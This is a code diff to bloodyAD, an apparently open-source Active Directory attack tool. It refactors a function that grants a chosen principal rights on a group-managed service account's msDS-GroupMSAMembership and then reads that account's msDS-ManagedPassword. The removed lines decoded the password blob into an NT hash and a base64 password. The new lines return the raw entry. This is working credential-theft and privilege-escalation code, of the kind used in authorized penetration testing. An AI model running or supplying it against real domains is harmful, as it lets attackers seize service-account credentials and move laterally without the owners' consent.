@@ -9,7 +9,6 @@ from bloodyAD.exceptions import BloodyError
 from bloodyAD.cli_modules import set as bloodySet
 import badldap
 from badldap.commons.keycredential import KeyCredential
-from badldap.wintypes.managedpassword import MSDS_MANAGEDPASSWORD_BLOB
 from kerbad.common import factory
 from kerbad.common.spn import KerberosSPN
 from kerbad.common.kirbi import Kirbi
@@ -459,49 +458,39 @@ async def groupMember(conn: ConnectionHandler, group: str, member: str):
     LOG.info(f"{member} added to {group}")
 
 
-async def gmsaGroup(conn: ConnectionHandler, gmsa_account: str, new_member: str):
+async def gmsaGroup(conn: ConnectionHandler, gmsa: str, member: str):
     """
     Add a new member (user, group, computer) to msDS-GroupMSAMembership of a gMSA so it can retrieve its password
 
-    :param gmsa_account: sAMAccountName, DN or SID of the gMSA
-    :param new_member: sAMAccountName, DN or SID of the new member
+    :param gmsa: sAMAccountName, DN or SID of the gMSA
+    :param member: sAMAccountName, DN or SID of the new member
     """
     ldap = await conn.getLdap()
-    control_flag = 0
     new_sd, _ = await utils.getSD(
-        conn, gmsa_account, "msDS-GroupMSAMembership", control_flag
+        conn, gmsa, "msDS-GroupMSAMembership", 0
     )
-    if "s-1-" in new_member.lower():
-        new_member_sid = new_member
+    if "s-1-" in member.lower():
+        member_sid = member
     else:
-        entry = None
-        async for e in ldap.bloodysearch(new_member, attr=["objectSid"]):
-            entry = e
+        async for e in ldap.bloodysearch(member, attr=["objectSid"]):
+            member_sid = e["objectSid"]
             break
-        new_member_sid = entry["objectSid"]
     access_mask = (
         accesscontrol.ACCESS_FLAGS["ADS_RIGHT_DS_READ_PROP"]
         | accesscontrol.ACCESS_FLAGS["ADS_RIGHT_DS_CONTROL_ACCESS"]
     )
-    utils.addRight(new_sd, new_member_sid, access_mask)
+    utils.addRight(new_sd, member_sid, access_mask)
 
     await ldap.bloodymodify(
-        gmsa_account,
+        gmsa,
         {"msDS-GroupMSAMembership": [(Change.REPLACE.value, new_sd.getData())]},
     )
 
-    LOG.info(f"{new_member} can now retrieve the password of {gmsa_account}")
+    LOG.info(f"{member} can now retrieve the password of {gmsa}")
     async for entry in ldap.bloodysearch(
-        gmsa_account, attr=["msDS-ManagedPassword"], raw=True
+        gmsa, attr=["msDS-ManagedPassword"]
     ):
-        gmsa_blob = MSDS_MANAGEDPASSWORD_BLOB.from_bytes(entry["msDS-ManagedPassword"][0])
-        yield {
-            "distinguishedName": entry["distinguishedName"],
-            "msDS-ManagedPassword": {
-                "NT": gmsa_blob.nt_hash,
-                "B64ENCODED": base64.b64encode(gmsa_blob.CurrentPassword).decode(),
-            },
-        }
+        yield entry
 
 
 async def rbcd(conn: ConnectionHandler, target: str, service: str):
